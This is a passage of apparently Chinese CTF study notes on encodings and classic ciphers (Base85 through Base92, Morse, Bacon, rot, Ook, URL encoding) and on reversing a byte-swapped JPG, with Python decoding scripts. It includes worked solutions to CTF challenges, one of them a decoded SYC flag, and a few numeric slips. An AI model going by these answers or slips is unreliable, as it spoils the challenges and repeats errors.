Rutter为btoa实用程序开发的一种二进制文本编码形式。通过使用五个ASCII字符来表示四个字节的二进制数据（使编码量1 &#x2F; 4比原来大，假设每ASCII字符8个比特），它比更有效UUENCODE或Base64的，它使用四个字符来表示三个字节的数据（1 &#x2F; 3的增加，假设每ASCII字符8个比特）。</li><li>用途是Adobe的PostScript和Portable Document Format文件格式，以及Git使用的二进制文件的补丁编码。</li><li>与Base64一样，Base85编码的目标是对二进制数据可打印的ASCII字符进行编码。但是它使用了更大的字符集，因此效率更高一些。具体来说，它可以用5个字符编码4个字节（32位）。</li></ul><p>摘自wiki介绍的一个例子：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715055000044-d63897dd-fccf-4a7c-accb-b29209034074.png"></p><hr><h2 id="Base36"><a href="#Base36" class="headerlink" title="Base36"></a><strong>Base36</strong></h2><p>Base36是一个二进制到文本编码表示方案的二进制数据以ASCII通过将其转化为一个字符串格式基数 -36表示。选择36十分方便，因为可以使用阿拉伯数字 0–9和拉丁字母 A–Z [1]（ISO基本拉丁字母）表示数字。</p><p>每个base36位需要少于6位的信息来表示。</p><p>摘自wiki的一个例子：</p><p>有符号的32位和64位整数分别最多只能容纳6个或13个base-36位数字（许多base-36位数字可能会使32位和64位整数溢出）。</p><p>例如，在base-36中，“ 922337203685477575807 ” 的64位带符号整数最大值为“ 1Y2P0IJ32E8E7 ”。</p><p>类似地，在base-36中，“ 2147483647 ” 的32位带符号整数最大值为“ ZIK0ZJ ”。</p><p>（这里没看太懂是怎么转换的，请大佬指教~）</p><p>用于从BASE10编码BASE36的Python代码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/gif/42988179/1715055000124-1f75903a-4542-478c-9d7e-520b68ed0d71.gif"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">def base36encode(<span class="hljs-keyword">integer</span>): <br>    <span class="hljs-keyword">chars</span> = <span class="hljs-string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span> <br>    <br>     sign = <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">integer</span> &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span> <br>     <span class="hljs-keyword">integer</span> = <span class="hljs-built_in">abs</span>(<span class="hljs-keyword">integer</span>) <br>     <span class="hljs-built_in">result</span> = <span class="hljs-string">&#x27;&#x27;</span> <br> <br>     <span class="hljs-keyword">while</span> <span class="hljs-keyword">integer</span> &gt; <span class="hljs-number">0</span>: <br>         <span class="hljs-keyword">integer</span>, remainder = divmod(<span class="hljs-keyword">integer</span>, <span class="hljs-number">36</span>) <br>         <span class="hljs-built_in">result</span> = <span class="hljs-keyword">chars</span>[remainder]+<span class="hljs-built_in">result</span><br> <br>      <span class="hljs-literal">return</span> sign+<span class="hljs-built_in">result</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/gif/42988179/1715055000314-d1b81dfc-ace9-4633-9e62-fa0119b9303b.gif"></p><hr><h2 id="Base58"><a href="#Base58" class="headerlink" title="Base58"></a><strong>Base58</strong></h2><ul><li>Base58是用于Bitcoin中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址。</li><li>相比Base64，<strong>Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+”和”&#x2F;“符号</strong>。</li></ul><p>设计Base58主要的目的是：</p><ol><li>避免混淆。在某些字体下，数字0和字母大写O，以及字母大写I和字母小写l会非常相似。</li><li>不使用”+”和”&#x2F;“的原因是非字母或数字的字符串作为帐号较难被接受。</li><li>没有标点符号，通常不会被从中间分行。</li><li>大部分的软件支持双击选择整个字符串。</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715055000283-ab4e1073-1df1-4a4e-a35a-ea2eeb24d265.png"></p><hr><h2 id="Base91"><a href="#Base91" class="headerlink" title="Base91"></a><strong>Base91</strong></h2><p>顾名思义，basE91需要91个字符来表示ASCII编码的二进制数据。 从94个可打印ASCII字符（0x21-0x7E）中，以下三个字符被省略以构建basE91字母：</p><p>-（破折号，0x2D）</p><p>\（反斜杠，0x5C）</p><p>‘（撇号，0x27）</p><ul><li>basE91是将二进制数据编码为ASCII字符的高级方法。</li><li>它类似于UUencode或base64，但效率更高。 basE91产生的开销取决于输入数据。 它的数量最多为23％（而base64为33％），范围可以降低到14％，通常发生在0字节块上。</li><li>这使得basE91对于通过二进制不安全连接（例如电子邮件或终端线）传输较大的文件非常有用。</li></ul><p>转换表由其余字符组成，如下所示。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715055000380-5bbae422-74c5-4f6e-9e3c-8994b81a1928.png"></p><hr><h2 id="Base92"><a href="#Base92" class="headerlink" title="Base92"></a><strong>Base92</strong></h2><p>有关Base92的资料实在是很少，但是笔者找到了这一篇博客：</p><p><a href="https://thenoviceoof.com/blog/projects/base92/">https://thenoviceoof.com/blog/projects/base92/</a></p><p><strong>以下介绍均摘自这篇博客</strong></p><p>“ 如果您对将二进制信息从一个地方转移到另一地方一无所知，那么就知道将数据从一个地方转移到另一地方 可能很危险。就是说，这对您的数据有害：也许您需要在仅用于ASCII文本的通道上传输Blob ，并且所有’\n’以C样式字符串表示的字节都会突然有一个同级符号’\r’。或者，您的传输层实际上真的真的是以null终止的字符串，并且您恰好在字节边界上连续有8个连续的0位，即使它位于blob中一个32位整数的中间，并且你结束了只有一半您的数据。</p><p>解决此问题的一种方法是使用base64，它使用所有数字和大写&#x2F;小写字母字符对数据进行编码（再加上两个，但现在我们将忽略它们）。现在，您在传输层上尝试解释您的字节时没有任何问题，因为每个人都可以很好地处理字母数字字符，如果没有，您可能不想使用它们。</p><p>当然，使用base64了一段时间后，您可能会注意到，虽然您不会因为一位反复无常的上帝以为他在提供帮助，却没有按照自己的意愿对数据进行更改，但您却通过使用放弃了效率base64。对于二进制blob中的每3个字节，如果需要传输字母数字字符，则有4个字节，因此您要以33％的容量税来支付数据保护费用：如果暴徒可以在保护球拍中掠走33％，相信他们会的。</p><p>看一下base64，您可能会注意到，除了可以使用的64个字符外，还有更多可显示的ASCII字符，base64可以在编码中使用这些字符以提高传输密度。这样就base85诞生了，使用了……您猜对了，有85个字符！这次，将4字节的二进制数据编码为5个ASCII字符，这将导致20％的传输大小开销。但你能做什么呢？好像没有更多可显示的ASCII了……哦，等等。</p><p>所以似乎没有人试图超越明显的下一步base85，所以我决定尝试自己做base92。</p><p>在键入编码的字符串时，&#96;和“与普通引号’太相似，以使其舒适。希望在区分l &#x2F; 1和0 &#x2F; O时使用的字体好。但是，我们将〜用作特殊符号（空字符串）。有94个可打印的ascii字符，因此我们最终得到91个字符，或每个字符6.5位。一旦包含〜，则将有92个字符：因此，为base92。（老实说，base91的名字太丑陋了，无法处理）</p><p>一旦每个字符有6.5位，则可以一次使用13位，并使用类似于base85的除法和取模方案，用它们产生两个输出字符。这可能意味着，与base92编码相比，它更能抵抗损坏，因为任何损坏都更加局限（一位更改仅影响2-3个字节，而不影响4个字节）。</p><p>注意：在某些需要某些输出的情况下，可能需要将〜用作空字符串分号：但是，传递空字符串进行解码不会导致它变成barf，因此不要求使用〜。</p><p>旁注：以前base92产生的输出的长度与输入的长度非单调增长。这已不再是这种情况。</p><p>另一个旁注：base64和base85更加优雅，将一个较小的字节整数干净地映射到另一个较小的字节整数。base92将13个字节映射为16个字符，从大小的角度来看，这比base85的4至5个字符更好，但是相当不雅观。我们还遵循使用高除数乘积作为第一个字节的base85约定。”</p><p>以上是笔者用谷歌翻译直接搬运的，如有描述不懂的小伙伴，请参照原文链接进行参考~</p><hr><h2 id="Base62"><a href="#Base62" class="headerlink" title="Base62"></a><strong>Base62</strong></h2><ul><li>Base62编码将数字转换为ASCII字符串（0-9，az和AZ），反之亦然，这通常会导致字符串较短。</li></ul><p>26个小写字母+26个大写字母+10个数字&#x3D;62</p><p><strong>（1）62进制与10进制的互相转化</strong></p><ul><li>62进制转10进制与2进制转10进制相似。</li></ul><p>2进制转10进制过程为： 从右到左用二进制的每个数去乘以2的相应次方，次方要从0开始。</p><p>62进制转10进制也类似，从右往左每个数*62的N次方，N从0开始。</p><p>那么，10进制转62进制也与10进制转2进制类似。 即：不断除以62取余数，然后倒序。</p><p><strong>（2）关于短Url的转换</strong></p><p>主要思路，维护一个全局自增的id，每来一个长url，将其与一个自增id绑定，然后利用base62将该自增id转换为base62字符串，即完成转换。</p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715055000510-4c2ce6fd-5fe5-4151-80c2-a7a41631a567.png"></h2><p>以上就是对Base系列编码的浅析，部分知识是笔者从wiki上搬运过来的，也参考了很多博客文章和资料。如有错误及不足之处，请大佬们多提建议~</p><p>参考资料：</p><p><a href="https://en.wikipedia.org/wiki">https://en.wikipedia.org/wiki</a></p><p><a href="https://blog.csdn.net/n0nameforn0w/article/details/87124053">https://blog.csdn.net/n0nameforn0w/article/details/87124053</a></p><p><a href="https://thenoviceoof.com/blog/projects/base92/">https://thenoviceoof.com/blog/projects/base92/</a></p><p><a href="https://segmentfault.com/a/1190000010516708">https://segmentfault.com/a/1190000010516708</a></p><hr><p>base16、32、64、85（较大的base）</p><h1 id="base2048"><a href="#base2048" class="headerlink" title="base2048"></a>base2048</h1><p>![[Pasted image 20250322214036.png]]</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>base64-&gt;base85（不断尝试大的base解密）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715054840619-03a3ac93-ffe3-4f18-9f20-a1e11db8fb0b.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715055163395-c20f725e-8e91-40b0-9fd6-df57b37a1eec.png"></p><p>先进行htlm解密再进行base85解密</p><h1 id="莫斯密码（-和-构成）"><a href="#莫斯密码（-和-构成）" class="headerlink" title="莫斯密码（-和.构成）"></a>莫斯密码（-和.构成）</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715256897011-7833ab5e-7fb5-4c4f-b942-d4a626b29944.png"></p><p>– ..- –.. .. -.- .. … –. —– —– -..</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715257773833-5814f7c9-3c85-4efd-9b86-75849a6312bc.png"></p><h1 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h1><p>分为标准型和W型</p><h1 id="培根密码（只由A、B构成）"><a href="#培根密码（只由A、B构成）" class="headerlink" title="培根密码（只由A、B构成）"></a>培根密码（只由A、B构成）</h1><p>只由A、B构成</p><p>1、培根密码（Bacon’s cipher），本质上是一种替换密码，根据对应转换规则进行加密解密，通过不明显的特征来隐藏明文信息；<br>2、培根密码加密规则，将明文中的每个字母，转换成一组五个英文字母，即可得到密文，转换规则表如下：<br>a AAAAA g AABBA n ABBAA t BAABA<br>b AAAAB h AABBB o ABBAB u-v BAABB<br>c AAABA i-j ABAAA p ABBBA w BABAA<br>d AAABB k ABAAB q ABBBB x BABAB<br>e AABAA l ABABA r BAAAA y BABBA<br>f AABAB m ABABB s BAAAB z BABBB<br>3、培根密码解密时，将密文进行5个字符分组，替换成对应的明文即可。<br>4、培根密码，通常有两种不同的转换规则，一种为即I与J、U与V使用相同的编码，一种为I与J、U与V都使用不同编码。</p><h1 id="html解密"><a href="#html解密" class="headerlink" title="html解密"></a>html解密</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715054779960-15e6c1fb-ccab-41f1-b60d-f3214c01327b.png"></p><h1 id="md5解密"><a href="#md5解密" class="headerlink" title="md5解密"></a>md5解密</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715055871376-83142243-7109-452e-b929-fde75f128b7f.png"></p><h1 id="二维码解码器"><a href="#二维码解码器" class="headerlink" title="二维码解码器"></a>二维码解码器</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715083471177-a09935e5-71b5-4097-8c40-55de8162053e.png"></p><p>把？后面的复制下来，进行base64解密</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715083498475-ab2040b3-6036-4618-8a2e-a941448f889e.png"></p><h1 id="兔子解密（rot5、13、18、47）"><a href="#兔子解密（rot5、13、18、47）" class="headerlink" title="兔子解密（rot5、13、18、47）"></a>兔子解密（rot5、13、18、47）</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1717231475092-2ecf40b6-bd4e-4a72-af4f-001efe921c8a.png"></p><h1 id="新佛曰"><a href="#新佛曰" class="headerlink" title="新佛曰"></a>新佛曰</h1><p><a href="http://hi.pcmoe.net/buddha.html?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTczNzU3NTAsImZpbGVHVUlEIjoiRHk1ZWtISmhLbzBhcDV2MyIsImlhdCI6MTY5NzM3NTQ1MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMxMTE0NzQxNX0.mTWIluoUq65XDAhk6XrX9TnWYTlf03r-E2CS43TFFdY">新约佛论禅&#x2F;佛曰加密 - 萌研社 - PcMoe!</a></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1727174685457-337375d6-e901-4a20-b4df-d26b987e4788.png"></p><h1 id="Cimbar"><a href="#Cimbar" class="headerlink" title="Cimbar"></a>Cimbar</h1><p><a href="https://www.bilibili.com/opus/975102170591395840">https://www.bilibili.com/opus/975102170591395840</a></p><p><img src="https://cdn.nlark.com/yuque/0/2024/webp/42988179/1731741150326-719c8948-e5c5-4141-8d66-cdd523903c04.webp"></p><p>每个符号在哈希空间内与其他符号相隔至少 20 位，这确保了即使图像模糊或受到其他干扰时，也能清晰区分各个符号。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/webp/42988179/1731741173056-444a9205-9de5-4e3f-a2d2-74fa10ad1e06.webp"></p><h1 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h1><h2 id="SYC"><a href="#SYC" class="headerlink" title="SYC"></a>SYC</h2><p>对着图片敲二进制就行</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1731741246905-615f38c7-dc35-4c36-9cc1-09740601b03f.png"></p><p>0101 0011 0101 1001 0100 0011 0111 1011</p><p>0100 0001 0110 1110 0011 0000 0111 0100</p><p>0110 1000 0011 0011 0111 0010 0101 1111</p><p>0100 0001 0110 1101 0100 0000 0111 1010</p><p>0011 0001 0110 1110 0011 1001 0101 1111</p><p>0101 0001 0101 0010 0101 1111 0100 0011</p><p>0110 1111 0011 0100 0110 0101 0111 1101</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 给定的二进制数据</span><br>binary_data = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">01010011010110010100001101111011</span><br><span class="hljs-string">01000001011011100011000001110100</span><br><span class="hljs-string">01101000001100110111001001011111</span><br><span class="hljs-string">01000001011011010100000001111010</span><br><span class="hljs-string">00110001011011100011100101011111</span><br><span class="hljs-string">01010001010100100101111101000011</span><br><span class="hljs-string">01101111001101000110010101111101</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 将所有二进制数据合并为一个字符串</span><br>binary_data = binary_data.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># 将每 8 位转换为一个字符</span><br>text = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(binary_data), <span class="hljs-number">8</span>):<br>    byte = binary_data[i:i+<span class="hljs-number">8</span>]<br>    char = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(byte, <span class="hljs-number">2</span>))  <span class="hljs-comment"># 将 8 位二进制转换为整数，再转换为字符</span><br>    text += char<br><br><span class="hljs-comment"># 输出结果</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;转换后的字符是：&quot;</span>)<br><span class="hljs-built_in">print</span>(text)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1731741830974-a2ed3a0b-efcc-4f98-96c7-b746ff80d49e.png"></p><h1 id="ook编码"><a href="#ook编码" class="headerlink" title="ook编码"></a>ook编码</h1><p><a href="https://www.splitbrain.org/services/ook">Brainfuck&#x2F;Ook! Obfuscation&#x2F;Encoding [splitbrain.org]</a></p><p>….. ….. ….! ?!!.? ….. ….. ….? .?!.? ….! .?… ….. …..</p><p>..!?! !.?.. ….. ….. ..?.? !.?.. ….. ….. ….. ….. !.?.. …..</p><p>….. .!?!! .?!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?… ….! ?!!.?</p><p>!!!!! !?.?! .?!!! !!!!! !!!!! .!!!. ?…. ….. ….. .!?!! .?… …..</p><p>….. .?.?! .?!.? .</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730350450413-b688bccb-cc64-49f5-9d7a-b065bcd8cb9c.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730350469512-8c9170b4-c67b-4984-ba84-6f2fd8cfd284.png"></p><h1 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h1><p><a href="https://blog.csdn.net/liuxl57805678/article/details/132335562">url中的特殊符号及特殊字符编码对照表_空字符url编码-CSDN博客</a></p><p><a href="https://www.w3school.com.cn/tags/html_ref_urlencode.asp">HTML URL 编码参考手册 (w3school.com.cn)</a></p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">有些符号在<span class="hljs-built_in">URL</span>中是不能直接传递的，如果要在<span class="hljs-built_in">URL</span>中传递这些特殊符号，那么就要使用他们的编码了。<br>编码的格式为：<span class="hljs-operator">%</span>加字符的<span class="hljs-variable">ASCII</span>码，即一个百分号<span class="hljs-operator">%</span>，后面跟对应字符的<span class="hljs-variable">ASCII</span>（<span class="hljs-number">16</span>进制）码值。例如 空格的编码值是<span class="hljs-string">&quot;%20&quot;</span>。<br>如果不使用转义字符，这些编码就会当<span class="hljs-built_in">URL</span>中定义的特殊字符处理。<br>下表中列出了一些<span class="hljs-built_in">URL</span>特殊符号及编码 十六进制值<br><span class="hljs-number">1</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">+</span> <span class="hljs-built_in">URL</span> 中<span class="hljs-operator">+</span>号表示空格 <span class="hljs-operator">%</span><span class="hljs-number">2</span><span class="hljs-variable">B</span><br><span class="hljs-number">2</span><span class="hljs-punctuation">)</span> 空格 <span class="hljs-built_in">URL</span>中的空格可以用<span class="hljs-operator">+</span>号或者编码 <span class="hljs-operator">%</span><span class="hljs-number">20</span><br><span class="hljs-number">3</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">/</span> 分隔目录和子目录 <span class="hljs-operator">%</span><span class="hljs-number">2</span><span class="hljs-variable">F</span><br><span class="hljs-number">4</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">?</span> 分隔实际的 <span class="hljs-built_in">URL</span> 和参数 <span class="hljs-operator">%</span><span class="hljs-number">3</span><span class="hljs-variable">F</span><br><span class="hljs-number">5</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">%</span> 指定特殊字符 <span class="hljs-operator">%</span><span class="hljs-number">25</span><br><span class="hljs-number">6</span><span class="hljs-punctuation">)</span> <span class="hljs-type">#</span> 表示书签 <span class="hljs-operator">%</span><span class="hljs-number">23</span><br><span class="hljs-number">7</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">&amp;</span><span class="hljs-variable">amp</span><span class="hljs-operator">;</span> <span class="hljs-built_in">URL</span> 中指定的参数间的分隔符 <span class="hljs-operator">%</span><span class="hljs-number">26</span><br><span class="hljs-number">8</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">URL</span> 中指定参数的值 <span class="hljs-operator">%</span><span class="hljs-number">3</span><span class="hljs-built_in">D</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件倒序</title>
    <link href="/2025/03/22/%E6%96%87%E4%BB%B6%E5%80%92%E5%BA%8F/"/>
    <url>/2025/03/22/%E6%96%87%E4%BB%B6%E5%80%92%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h1><p><a href="https://blog.csdn.net/MarkRao/article/details/120900188">一道经典的Misc图片倒叙题目_misc png 逆序-CSDN博客</a></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="正着看还是反着看呢？"><a href="#正着看还是反着看呢？" class="headerlink" title="正着看还是反着看呢？"></a>正着看还是反着看呢？</h2><p>看到要倒序，注意他这里是两个字节一组进行倒序的</p><p>jpg 文件头 FF D8 FF E0</p><p>文件尾是 FF D9</p><p>D9FF</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1723711338491-709d7522-23a5-40ce-bb3e-d629bd22466e.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1723712639959-32079af1-6dd4-47b0-83a3-6ec25848e1f0.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1723718995985-32ba81dd-7c62-47d2-94b2-baac03d45509.png"></p><p>可以发现有个flag.txt的倒序，所以我们整个都复制过去进行处理</p><p>如果只复制到文件尾的话就会丢失文件，导致隐藏文件的消失</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1723719081989-cbd6dbe2-0c14-4a85-b2ae-c70ff95b07b6.png"></p><p>选中尾部拉到最底部，然后（编辑→复制为→复制为十六进制文本）然后在桌面创建一个文本文件，ctrl+v直接复制进去，然后编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 打开并读取原始文件内容</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;D:\网站下载\exppy\1.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    a = f.read()<br><br><span class="hljs-comment"># 去掉原始数据中的换行符、空格等不可见字符</span><br>a = a.replace(<span class="hljs-string">b&#x27;\n&#x27;</span>, <span class="hljs-string">b&#x27;&#x27;</span>).replace(<span class="hljs-string">b&#x27;\r&#x27;</span>, <span class="hljs-string">b&#x27;&#x27;</span>).replace(<span class="hljs-string">b&#x27; &#x27;</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 将内容逆序</span><br>a = a[::-<span class="hljs-number">1</span>]<br><br><span class="hljs-comment"># 将逆序内容写入新的文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;D:\网站下载\exppy\new.txt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> new:<br>    new.write(a)<br><br><span class="hljs-comment"># 读取逆序后的文件内容</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;D:\网站下载\exppy\new.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    b = f.read()<br><br><span class="hljs-comment"># 将内容转换为可变的字节数组</span><br>blist = <span class="hljs-built_in">bytearray</span>(b)<br><br><span class="hljs-comment"># 按两个字节为一组进行交换</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(blist) - <span class="hljs-number">1</span>, <span class="hljs-number">2</span>):<br>    blist[i], blist[i + <span class="hljs-number">1</span>] = blist[i + <span class="hljs-number">1</span>], blist[i]<br><br><span class="hljs-comment"># 打开目标文件以写入最终内容</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;D:\网站下载\exppy\flag.txt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> flag:<br>    <span class="hljs-comment"># 将所有处理后的字节内容连续写入文件</span><br>    flag.write(blist)<br><br><span class="hljs-comment"># 打印最终处理的内容（以逆序显示）</span><br><span class="hljs-built_in">print</span>(blist)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">format_hex_data_from_file</span>(<span class="hljs-params">input_file, output_file</span>):<br>    <span class="hljs-comment"># 读取文件内容</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        hex_data = file.read().strip()<br><br>    <span class="hljs-comment"># 将字符串分成每两个字符一组</span><br>    grouped_data = [hex_data[i:i + <span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(hex_data), <span class="hljs-number">2</span>)]<br><br>    <span class="hljs-comment"># 以16组为一行，每组之间用空格隔开</span><br>    formatted_data = <span class="hljs-string">&#x27;\n&#x27;</span>.join([<span class="hljs-string">&#x27; &#x27;</span>.join(grouped_data[i:i + <span class="hljs-number">16</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(grouped_data), <span class="hljs-number">16</span>)])<br><br>    <span class="hljs-comment"># 将格式化后的数据写入输出文件</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        file.write(formatted_data)<br><br><br><span class="hljs-comment"># 输入和输出文件路径</span><br>input_file = <span class="hljs-string">r&#x27;D:\网站下载\exppy\flag.txt&#x27;</span><br>output_file = <span class="hljs-string">r&#x27;D:\网站下载\exppy\newflag.txt&#x27;</span><br><br><span class="hljs-comment"># 格式化并写入输出文件</span><br>format_hex_data_from_file(input_file, output_file)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1723715121060-d6f65c17-7358-467d-a682-ea46aa9ddb2c.png"></p><p>导入十六进制，保存，修改后缀名为jpg，（文件→导入十六进制→保存→重命名为flag.jpg)</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1723716388658-a2047cef-993d-4fcf-946f-78ac2b10008b.png"></p><p>得到照片</p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/42988179/1723716519153-5455cc00-e756-47a2-a136-4f594c257acc.jpeg"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1723718971683-aa1ec613-1bdb-4841-889a-c5d19ab49252.png"></p><p><img 